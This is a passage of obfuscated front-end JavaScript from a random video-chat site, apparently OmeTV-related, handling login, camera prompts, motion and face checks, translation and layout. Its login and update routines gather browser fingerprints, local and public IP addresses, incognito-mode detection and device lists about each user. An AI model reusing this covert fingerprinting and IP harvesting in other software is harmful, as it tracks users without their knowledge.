          n.Release = config.release, n.versionCode = config.versionCode, n.Gender = genderSelector.gender().value, n.videoDevices = MediaDevices.videoDevices(), n.audioDevices = MediaDevices.audioDevices(), n.ivd = MediaDevices.hasIdenticalVideoDevices(), n.internalIP = myIP.local(), n.externalIP = myIP.global(), n.userAgent = navigator.userAgent, n.bua = !Helper.vua(), n.location = location.href, n.im = IncognitoMode.detected(), n.hufData = Ca.debugData(), n.language = navigator.language, n.chatLanguage = _.language;
          const a = n;
          if (this.getLocalStreamSettings) {
            const n = this.getLocalStreamSettings();
            var f = {};
            f.width = ~~n.width, f.height = ~~n.height, a.streamSettings = f;
          }
          return window.motionDetector && (a.validMotionDetection = !motionDetector.containsZerosOnly), config.is_vk_app && (a.VK = VKData.get()), blogger.validBlogger && (a.PatriotId = this.userId, a.BId = blogger.id), a;
        }), ma(this, "update", () => {
          var e, n, a, f, u = i;
          (this, e = ga, n = this, a = va(this, e, "get"), f = _0x28ad, a.get ? a.get.call(n) : a.value).sendUED(this.data());
        }), a = e, function (e, n, a) {
          var f = _0x28ad;
          if (n.set) n.set.call(e, a); else {
            if (!n.writable) throw new TypeError("attempted to set read only private field");
            n.value = a;
          }
        }(n = this, va(n, ga, "set"), a), $(window).on("changelang", this.update.bind(this));
      }
    }(Ua);
    window.genderSelector = new GenderSelector(r), window.dialogData = new DialogData({}, Ua), window.countryFilter = new CountryFilter(Ua), MediaDevices.isWebRTCSupported().then(e => {
      var a = n;
      if (!e) throw new LockerError(_.translate("legacy_browser"));
    }).then(() => e ? Ca.get() : [Za, Ga]).then(e => {
      [Za, Ga] = e;
    }).then(IncognitoMode.detect).then(i.connect).then(i.register).then(a => (a.OriginId = config.origin, a.Fingerprint = Za, a.Fingerprint2 = Ga, Ya && (a.D1 = ba(Ya, Za), a.D2 = ba(Ya)), a.FirstLogin = e, a.Room = config.room, a.Version = parseFloat(config.release), a.Gender = genderSelector.gender().value, u.isLoggedIn() && (u.tokenData.chatSnData ? (a.SnData = u.tokenData.chatSnData, a.SnHmac = u.tokenData.chatSnSign) : (a.SnDataStr = u.tokenData.SnDataStr, a.SnHmac = u.tokenData.SnHmac), new SnAPI(u.tokenData.token).renew().then(u.apiCallback.bind(u)).catch(u.logout.bind(u))), a)).then(i.login).then(i => {
      var o = n;
      const {isCoolUser: c, isPayer: t, banNum: x, country: s, data: l} = i;
      if (window.rComponents.loginPopup.setCountry(s), l.ChatAddr) {
        var d = {};
        if (d.test = true, genderSelector.preselect(i), r.userId = l.UserId, l.RoomStatsHint = config.room, l.ExtraUserData = r.data(), config.is_vk_app && VKData.updateUser.call(VKData, s), Helper.queryParam("ban") && Ka.dispatch(Sa(d)), !u.isLoggedIn()) {
          if (blogger.allowVPN || La.check().then(e => {
            e && Va();
          }), Helper.isIPadPro()) return Va();
          if (config.sn) return Va();
        }
        const n = function () {
          var n = o;
          if (e) {
            var a = {};
            a.isCoolUser = c, a.isPayer = t;
            const e = new class {
              constructor(e) {
                var n = f;
                wa(this, "criticalScreenLength", 1500), wa(this, "dialogCounter", 0), wa(this, "motionDetectorCounter", 0), wa(this, "src", null), wa(this, "onBeginDialog", (e, a) => {
                  var f = n;
                  const i = e(), u = i.length;
                  if (this.dialogCounter += u > this.criticalScreenLength ? -this.dialogCounter : 1, !this.props.settings.showNow && !this.showNow()) return;
                  if (a(), $(".screen.local", this.$popup).attr("src", "data:image/jpeg;base64," + (this.src || i)), "ome" === config.env) {
                    const e = Math.floor(8 * Math.random()) + 1;
                    $(".screen.example", this.$popup).removeClass((e, n) => n.split(/\s+/).filter(e => /^src_/.test(e)).join(" ")), $(".screen.example", this.$popup).addClass("src_" + e);
                  }
                  this.src = null, this.$ok.addClass("disabled"), Overlay.show(this.$popup);
                  let r = 2 * this.props.timeout;
                  if ($("span", this.$ok).html(r), this.countdownInterval = setInterval((() => {
                    var e = f;
                    r -= 1, $("span", this.$ok).html(r), 0 === r && (this.enableOK(), this.resetInterval());
                  }).bind(this), 500), this.props.checkAgainEnabled) {
                    const n = () => {
                      var n = f;
                      e().length > this.criticalScreenLength && this.enableOK();
                    };
                    this.checkAgainInterval = setInterval(n.bind(this), 500);
                  }
                  this.showNow() && (this.props.increaseTimeout(), this.props.showNow());
                }), wa(this, "hide", () => {
                  var e = n;
                  Overlay.hide(this.$popup), this.resetInterval();
                }), wa(this, "enableOK", () => {
                  var e = n;
                  $("span", this.$ok).html("OK"), this.$ok.removeClass("disabled"), this.resetInterval();
                }), wa(this, "resetInterval", () => {
                  var e = n;
                  clearInterval(this.countdownInterval), this.countdownInterval = null, this.checkAgainInterval && clearInterval(this.checkAgainInterval);
                }), wa(this, "showNow", () => 0 !== this.dialogCounter && this.dialogCounter % this.props.showAfterConnectionsNum == 0), this.props = new ha(e), this.$popup = $("#local-video-warning-popup"), this.$ok = $(".ok", this.$popup), this.$ok.click(() => {
                  var e = n;
                  this.$ok.hasClass("disabled") || (this.hide(), this.props.reset(), this.onOk && this.onOk());
                }), $(window).on("socket:notification", (e, a) => {
                  var f = n;
                  a.Data.no_face && (this.src = a.Data.pic);
                }), $(window).on("motion_detector:alert", (e, a) => {
                  var f = n;
                  this.motionDetectorCounter += a.step, this.motionDetectorCounter % this.props.showAfterConnectionsNum == 0 && this.props.showNow();
                });
              }
            }(l.Settings), i = new _r(e, Ua, r, a);
            var d = {};
            d.pos = Ha;
            var D = {};
            D.type = "camera_access_hint/show", D.payload = d;
            var b = {};
            b.pos = Na;
            var C = {};
            C.type = "camera_access_hint/show", C.payload = b;
            var m = {};
            m.pos = null;
            var v = {};
            v.type = Pa, v.payload = m;
            var g = {};
            g.showLeft = () => Ka.dispatch(D), g.showRight = () => Ka.dispatch(C), g.hide = () => Ka.dispatch(v);
            var _ = {};
            _.isCoolUser = c, _.onGetStream = i.setLocalStream.bind(i), _.onGetStreamFail = i.onGetStreamFail.bind(i), _.onGetDeviceList = Ua.close.bind(Ua), _.isLoggedIn = u.isLoggedIn.bind(u), _.extraUserData = r, _.CameraAccessHint = g;
            var h = {};
            h.extraUserData = r, Ya = new MediaDevices(_), i.mediaDevices = Ya, window.chat = new Chat(s, i, Ua), window.quotes = new Quotes(Ua), window.motionDetector = new class {
              constructor(e, n) {
                var a = f;
                za(this, "width", 160), za(this, "height", 120), za(this, "step", 5), za(this, "readyToDiff", false), za(this, "pixelDiffThreshold", 24), za(this, "currentScore", new ya(5)), za(this, "imageDataHistory", new ya(5)), za(this, "i", 0), za(this, "visualization", !!Helper.queryParam("visualize")), za(this, "containsZerosOnly", false), za(this, "visualize", () => {
                  var e = a;
                  this.info = document.createElement("span"), this.info.classList.add("debug"), document.getElementById("local-video-wrapper").appendChild(this.info), Helper.queryParam("timer") && setInterval(this.capture, ~~Helper.queryParam("timer") || 100);
                }), za(this, "capture", () => {
                  var e = a;
                  if (this.i++, !this.readyToDiff || this.i % this.step != 0) return;
                  this.readyToDiff = false, this.video.paused && this.video.play(), this.currentScore.clear();
                  for (const n of this.imageDataHistory.data) {
                    this.context.putImageData(n, 0, 0);
                    const a = this.measureCurrentScore();
                    this.currentScore.add(a);
                  }
                  this.addCurrentSrcToHist(), this.visualization && (this.info.innerHTML = this.currentScore.data.join(" "));
                  const n = this.currentScore.data.reduce((e, n) => e + n);
                  var f = {};
                  f.step = this.step, this.containsZerosOnly || 0 !== n || $(window).trigger("motion_detector:alert", f), this.readyToDiff = true;
                }), za(this, "addCurrentSrcToHist", () => {
                  var e = a;
                  const n = this.createContext();
                  n.drawImage(this.video, 0, 0, this.width, this.height);
                  const f = n.getImageData(0, 0, this.width, this.height);
                  this.imageDataHistory.add(f);
                }), za(this, "measureCurrentScore", () => {
                  var e = a;
                  this.context.globalCompositeOperation = "difference", this.context.drawImage(this.video, 0, 0, this.width, this.height);
                  const n = this.context.getImageData(0, 0, this.width, this.height).data;
                  let f = 0, i = 0;
                  for (let a = 0; a < n.length; a += 4) {
                    const u = n[a], r = n[a + 1], o = n[a + 2];
                    i += u + r + o + n[a + 3], .3 * u + .6 * r + .1 * o >= this.pixelDiffThreshold && f++;
                  }
                  const u = 0 === i;
                  this.containsZerosOnly !== u && (this.containsZerosOnly = u, this.params.extraUserData.update()), this.context.globalCompositeOperation = "source-over";
                  const r = f / n.length * 4;
                  return Math.round(1e5 * r) / 1e3;
                }), za(this, "serialize", () => this.currentScore.data), za(this, "createContext", () => {
                  var e = a;
                  const n = document.createElement("canvas");
                  return n.width = this.width, n.height = this.height, n.getContext("2d");
                }), this.video = e, this.params = n, this.context = this.createContext(), this.histContext = this.createContext();
                const i = () => {
                  var e = a;
                  this.addCurrentSrcToHist(), this.readyToDiff = true, this.video.removeEventListener("play", i);
                };
                this.video.addEventListener("play", i), this.visualization && this.visualize();
              }
            }(i.localVideo, h), window.genderSelector.initialize(r), window.countryFilter.initialize(s, l.Room, c), $(document).trigger("roulette:init");
          } else window.countryFilter && countryFilter.setFilter();
          i.silencedByIpOrFp && $(document).trigger("roulette:silence"), x > 5 && !c && !u.isLoggedIn() && Va(), !IncognitoMode.detected() && Helper.vua() || c || u.isLoggedIn() || Va(), "TR" === s && settings.disableTranslator();
        };
        a.then(function () {
          var e = o;
          const a = myIP.local();
          a && (l.ClientAddrIp = a), this.connect(l).then(n);
        }.bind(Ua));
      } else if (l.BanId) Ka.dispatch(Sa(l)); else {
        if (l.IB || 5 === l.Error) return Va();
        u.logout();
      }
      e && (mn.init(), mn.pageView(i));
    }).catch(e => {
      var a = n;
      console.log(e), "LockerError" === e.name ? new Locker(e.message) : Locker();
    });
  }, (Ja = "init") in (Wa = Ia) ? Object.defineProperty(Wa, Ja, {value: Ra, enumerable: true, configurable: true, writable: true}) : Wa[Ja] = Ra;
  var Oa = Ia;
  class Xa extends u.a.Component {
    constructor(e) {
      super(e);
    }
    ["render"]() {
      var e = f;
      if (!this.props.pos) return "";
      let n = "camera-access-dummy" + (Helper.isMacOrLinux() ? " linux" : "");
      var a = {};
      return a.className = n, u.a.createElement("div", a, this.maybeRenderLeft(), this.maybeRenderRight());
    }
    ["maybeRenderLeft"]() {
      var e = f, n = {};
      n.className = "camera-dummy__left";
      var a = {};
      a.className = "arrow";
      var i = {};
      i.className = "tr", i["data-tr-id"] = "1323", i["data-tr"] = "click_allow";
      var r = {};
      return r.className = "camera-dummy__girl", this.props.pos !== Ha ? "" : u.a.createElement("div", n, u.a.createElement("div", a), u.a.createElement("h2", i, t("click_allow")), u.a.createElement("div", r));
    }
    ["maybeRenderRight"]() {
      var e = f, n = {};
      n.className = "camera-dummy__right";
      var a = {};
      a.className = "arrow";
      var i = {};
      i.__html = t("allow_device_access");
      var r = {};
      r.className = "tr", r["data-tr-id"] = "1324", r["data-tr"] = "allow_device_access", r.dangerouslySetInnerHTML = i;
      var o = {};
      return o.className = "camera-dummy__girl", this.props.pos !== Na ? "" : u.a.createElement("div", n, u.a.createElement("div", a), u.a.createElement("h2", r), u.a.createElement("div", o));
    }
  }
  var $a = te(e => ({pos: e.cameraAccessHint.pos}))(Xa);
  class Qa extends u.a.Component {
    constructor(e) {
      super(e);
    }
    ["componentDidMount"]() {
      var e = f;
      return OmetvLanding.enabled() ? new OmetvLanding : AppPopup.enabled() ? new AppPopup : !window.Promise || -1 !== navigator.userAgent.indexOf("Edge") || Helper.isIE() ? new Locker(_.translate("legacy_browser"), false) : (window.settings = new Settings, _.translateAll(), Oa.init(true), void (Helper.isIE() || (Noise.init(), Noise.start())));
    }
    ["render"]() {
      var e = f, n = {};
      n.id = "roulette";
      var a = {};
      return a.className = "roulette-box", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement(Ee, null), u.a.createElement(Ie, null)), u.a.createElement(Pn, null), this.renderOmeLanding(), u.a.createElement($a, null));
    }
    ["renderOmeLanding"]() {
      var e = f;
      return OmetvLanding.enabled() ? u.a.createElement(Kn, null) : "";
    }
  }
  var ef = Qa, nf = class {
    constructor() {
      var e = f;
      const n = this;
      this.defaultLanguage = "en", this.init(this.defaultLanguage), $(window).on("changelang", (a, f) => {
        var i = e;
        n.init(f), n.translateAll();
      });
    }
    ["init"](e) {
      this.language = e;
    }
    ["translateAll"]() {
      var e = f;
      $(".tr").each((n, a) => {
        var f = e;
        const i = $(a), u = i.attr("data-tr"), r = this.translate(u) || this.country(u);
        r && ("INPUT" === a.tagName || "TEXTAREA" === a.tagName ? (i.attr("placeholder", r), $(".emojionearea-editor").attr("placeholder", r)) : i.html(r));
      });
      const n = $(".toggle--on-off label");
      ["yes", "no"].forEach(a => n.attr("data-" + a, this.translate(a))), $(".appstore.app-btn").removeClass().addClass("appstore app-btn en " + this.language), $(".googleplay.app-btn").removeClass().addClass("googleplay app-btn en " + this.language), $(window).trigger("i18n:update", this.language);
    }
    ["translate"](e) {
      var n = f;
      const a = translations[this.language][e] || translations[this.defaultLanguage][e];
      return a ? a.replace(/{{(.*?)}}/gi, e => {
        var a = n;
        const f = e.replace(/{|}/g, "").trim();
        return config[f] || e;
      }) : a;
    }
    ["country"](e) {
      var n = f;
      return countries[this.language] ? countries[this.language][e] : countries[this.defaultLanguage][e];
    }
    ["changeText"](e, n, a) {
      var i = f;
      e.text(this.translate(n)), e.data("tr", n), e.data("tr-id", a);
    }
  }, af = {};
  af.updateOnlineCounter = e => {
    var n = f;
    Ka.dispatch(function (e) {
      var a = n, f = {};
      f.online = e;
      var i = {};
      return i.type = Fa, i.payload = f, i;
    }(e));
  }, af.snSignIn = () => {
    var e = f, n = {};
    n.type = "sn_auth/sign_in", Ka.dispatch(n);
  }, af.snSignOut = () => {
    var e = f, n = {};
    n.type = "sn_auth/sign_out", Ka.dispatch(n);
  };
  var ff = {};
  ff.store = Ka, window._ = new nf, window.t = _.translate.bind(_), window.rComponents = {}, window.ductTape = af, window.LockerError = function (e) {
    var n = f;
    this.name = "LockerError", this.message = e, this.stack = (new Error).stack;
  }, LockerError.prototype = Object.create(Error.prototype), LockerError.prototype.constructor = LockerError, o.a.render(u.a.createElement(function (e) {
    var n = f, a = e.store, r = e.context, o = e.children, t = Object(i.useMemo)(function () {
      var e = n, f = new d(a);
      return f.onStateChange = f.notifyNestedSubs, {store: a, subscription: f};
    }, [a]), x = Object(i.useMemo)(function () {
      return a.getState();
    }, [a]);
    Object(i.useEffect)(function () {
      var e = n, f = t.subscription;
      return f.trySubscribe(), x !== a.getState() && f.notifyNestedSubs(), function () {
        var n = e;
        f.tryUnsubscribe(), f.onStateChange = null;
      };
    }, [t, x]);
    var s = r || c, l = {};
    return l.value = t, u.a.createElement(s.Provider, l, o);
  }, ff, u.a.createElement(ef, null)), config.container);
}]), function () {
  var e, n, a, f, i, u, r, o, c, t, x, s, l, d, D, b, C, m, v, g, h, w, p, y, z, B, L, M, F, A;
  A = _0x28ad, DomainName.validate(), o = $(".roulette-box"), c = $("#video-container"), x = $(".video-container__wrapper>div"), a = $(".chat-container"), e = $(".buttons"), n = $(".chat"), g = new Pleer, config.vertical_layout ? ($("#roulette").addClass("vertical").show(), z = false, b = 1, M = function (e, n) {
    var a, f = A;
    return a = ["ms", "pl"], z = -1 !== ["ms", "it", "hu", "nl", "pl", "pt", "tr", "ja", "uk"].indexOf(n), b = -1 !== a.indexOf(n) ? 1.2 : 1, v(null, false);
  }, $(window).on("i18n:update", M), s = function (n, a, f, i) {
    var u, r, o, c = A;
    return o = function () {
      var n = _0x28ad;
      return e.removeClass("hide-last-btn");
    }, r = function () {
      var n = _0x28ad;
      return e.addClass("hide-last-btn");
    }, n / f < 1.8 ? (e.addClass("vertical"), e.css("font-size", ""), n / f > 1.2 ? r() : o()) : (e.removeClass("vertical"), z || n / f < 3 ? (u = e.width() / 20 / b, r()) : (u = e.width() / 25, o()), e.css("font-size", u), $(".caption__online").css("font-size", .8 * u)), CountryFilter.adjustPopup(n, a, f, u, i);
  }, v = function (f, i) {
    var u, r, t, l, d, D, b, C = A;
    if (null == i && (i = true), u = $(window).height() / 768 * 10, l = o.width(), t = o.height(), D = 0, b = 0, d = function () {
      var e, n = C;
      return (b = l / 2) > (e = (D = t - r) / .75) ? (b = e, c.removeClass("full-width")) : c.addClass("full-width"), D > b && (D = b), b < 150 ? x.addClass("small") : b < 355 ? x.removeClass("small").addClass("medium") : x.removeClass("small medium");
    }, r = t / 4, d(), r = t - D, c.height(D), x.width(b), a.height(r), e.width(b), n.width(b), g.refreshMax(), s(b, D, r, u), $(document).trigger("roulette:resize", {}), i) return setTimeout(v.bind(window, null, false), 100);
  }, M(0, _.language), $(window).resize(v)) : (w = void 0, D = void 0, t = $("#videoResizer"), i = $(".video-container__local-video"), r = $("#remote-video-wrapper"), f = $(".chat__greetings-button-wrapper"), l = parseInt(e.css("padding-top")), F = parseInt(r.css("margin-bottom")), d = 0, B = false, C = config.is_vk_app ? 2 : 1.33, L = function () {
    var e, n, a, f, i = A;
    return (n = $(".chat__welcome-text").height()) && (n += 50), f = $(".chat__greetings-text").toArray().map(function (e) {
      var n = i;
      return $(e).height();
    }).reduce(function (e, n) {
      return e + n;
    }), a = n + $(".chat__greetings-button").height() + f + 140, $(".chat__greetings-content").css("min-height", a + "px"), (e = $(".chat__greetings")).height() < 500 ? e.addClass("small") : e.removeClass("small");
  }, window.updateGreetingsButtons = function () {
    var e, n, a = A;
    if (f.is(":visible")) return e = (n = f.last().width()) / (-1 === ["de", "nl", "pt"].indexOf(_.language) ? 7 : 9), f.css("font-size", e + "px"), $(".chat__greetings-button").height(n / 3.5);
  }, h = function () {
    var n, a, f = A;
    n = c.width() + d + 20, a = (e.height() + 2 * l) / 2 + e.offset().top;
    var i = {};
    return i.chatOffset = n, i.topOffset = a, $(document).trigger("roulette:resize", i);
  }, p = function () {
    var e, n, f, i, u, r = A;
    return u = (f = (e = $(".buttons__button", a)).filter(":visible")).filter(":not(.report-button)").map(function (e, n) {
      var a = r;
      return Helper.measureText($(".tr", n)).width;
    }), i = 1.4 * Math.max.apply(null, u), e.css("width", i + "px"), n = parseInt(f.css("margin-right")), d = f.length * (i + n) + n, $(".buttons__button.next-button", a).css("width", i + "px"), y(), m();
  }, $(window).on("changelang", p), y = function () {
    var e, n, a = A;
    return e = 1.33 * (o.height() - 2 * F) + 2 * F, n = o.width() - d - t.width(), w.setMaxWidth(Math.min(e, n)), w.resize(c.width(), o.height());
  }, m = function () {
    var e = A;
    if (null != window.countryFilter) return countryFilter.justifyPopup(l);
  }, v = function (e, n) {
    var a, f, i = A;
    a = o.height(), n && (f = (a - 3 * F) / C * 1.33 + 2 * F, c.width(f)), y(), D.setMaxHeight(200), D.resize(null, $(".chat__textfield").height()), L(), p(), setTimeout(p, 100), h();
  }, w = new Resizer(t, c, {resizeY: false, onresize: function (n, f) {
    var u, c, x, s, d = A;
    return a.css("left", n + t.width()), u = a.width() - 2 * l - 2, x = o.width() + 2 * F + 4, c = o.height(), x >= 1040 && c >= 800 && u < 1e3 || (x < 1040 || c < 800) && u < 830 ? a.addClass("small") : a.removeClass("small"), s = (s = 1.33 * (f - (n = $(".video-container__wrapper").width()) / 1.33 - 3 * F)) > n ? n : s, i.width(s), i.height(s / 1.33), r.height(n / 1.33), s < 150 ? i.addClass("small") : s < 355 ? i.removeClass("small").addClass("medium") : i.removeClass("small medium"), B && (e.width() > (config.enable_geo ? 850 : 750) ? $(".report-button").show() : $(".report-button").hide()), g.refreshMax(), L(), updateGreetingsButtons(), h(), m();
  }, minWidth: 290}), D = new Resizer($("#chat-resizer"), $("#chat-textfield"), {resizeX: false, onresize: function (e, n) {
    var a = A;
    return $(".chat__body").css("bottom", n + 5), L(), updateGreetingsButtons();
  }, minHeight: 90, maxHeight: 300}), $(function () {
    var e, n = A;
    return window._ || (window._ = new I18n), config.is_vk_app && window.screen.availHeight && ((e = window.screen.availHeight - 250) < 400 && (e = 400), e > 700 && (e = 700), $("#roulette").height(e)), $("#roulette").show(), B = $(".report-button").is(":visible"), o.height() > 900 && D.resize(0, 200), v(null, true), $(window).resize(v);
  }), $("a", $("#roulette")).attr("target", "_blank"), u = $(".chat__greetings-logo"), $("img", u)[0] && u.height($("img", u)[0].naturalHeight));
}["call"](this), function () {}.call(this));
